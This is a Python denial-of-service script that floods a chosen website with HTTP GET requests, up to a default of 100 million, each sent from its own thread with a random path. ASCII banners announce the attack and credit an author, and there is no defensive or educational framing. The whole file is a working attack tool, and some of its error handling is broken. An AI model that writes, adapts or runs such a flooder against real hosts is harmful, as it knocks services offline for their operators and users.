
import random
import socket
import string
import sys
import threading
import time

host = ""
ip = ""
port = 0
num_requests = 0

if len(sys.argv) == 2:
    port = 80
    num_requests = 100000000
elif len(sys.argv) == 3:
    port = int(sys.argv[2])
    num_requests = 100000000
elif len(sys.argv) == 4:
    port = int(sys.argv[2])
    num_requests = int(sys.argv[3])
else:
    print 
print (f" _   _ ___  ___")
print (f"| | | / __|/ _ \ ")
print (f"| |_| \__ \  __/ ")
print (f"\__,_|___/\___| ")
print (f"----------------------------------------------------------------")
print (f"pytohn3 {sys.argv[0]} < Hostname > < Port > < Number_of_Attacks >")
print (f"----------------------------------------------------------------")

# Convert FQDN to IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print (" ERROR\n Make sure you entered a correct website")
    sys.exit(2)

# Create a shared variable for thread counts
thread_num = 0
thread_num_mutex = threading.Lock()


# Print thread status
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #print the output on the sameline
    sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)} ")
    sys.stdout.flush()
    thread_num_mutex.release()


# Generate URL Path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data


# Perform the request
def attack():
    print_status()
    url_path = generate_url_path()

    # Create a raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        # Open the connection on that raw socket
        dos.connect((ip, port))

        # Send the request according to HTTP spec
        #old : dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [ No connection, server may be down ]: {str(socket.error)}")
    finally:
        # Close our socket gracefully
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()
print (F"MADE BY :")
print (f"                 _   ")
print (f" _ __  ______  _| |_ ")
print (f"| '_ \|_  /\ \/ / __|")
print (f"| | | |/ /  >  <| |_  ")
print (f"|_| |_/___|/_/\_\\__|")
print(f"_______________________________________________________________________________________________________________________")
print (f"   __  ____  ____  __    ___  __ _     ____  ____  __   ____  ____  ____  ____      __   __ _    ____________         ")
print (f"  / _\(_  _)(_  _)/ _\  / __)(  / )   / ___)(_  _)/ _\ (  _ \(_  _)(  __)(    \    /  \ (  ( \  |            |        ")                                                                                                               
print (f" /    \ )(    )( /    \( (__  )  (    \___ \  )( /    \ )   /  )(   ) _)  ) D (   (  O )/    /  | {str (ip)} | ")                                                                                                            
print (f" \_/\_/(__)  (__)\_/\_/ \___)(__\_)   (____/ (__)\_/\_/(__\_) (__) (____)(____/    \__/ \_)__)  |            |        ")                                                                                                   
print (f"______________________________________________________________________________________________________________________")
print (f" ____   __  ____  ____    _____________      ")
print (f"(  _ \ /  \(  _ \(_  _)  |             |     ")
print (f" ) __/(  O ))   /  )(    | {str(port)} |  ")             
print (f"(__)   \__/(__\_) (__)   |             |      ")
print (f"______________________________________________________________________")
print (f"  ____  ____  __   _  _  ____  ____  ____  ____    _____________________      ")                                                                                         
print (f" (  _ \(  __)/  \ / )( \(  __)/ ___)(_  _)/ ___)  |                     |     ")
print (f"  )   / ) _)(  O )) \/ ( ) _) \___ \  )(  \___ \  | {str(num_requests)} |     ")
print (f" (__\_)(____)\__\)\____/(____)(____/ (__) (____/  |                     |     ")
print (f"______________________________________________________________________________________________________________________")
# Spawn a thread per request
all_threads = []
for i in range(num_requests):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)
    # Adjusting this sleep time will affect requests per second
    time.sleep(0.01)
for current_thread in all_threads:
    current_thread.join()  # Make the main thread wait for the children threads
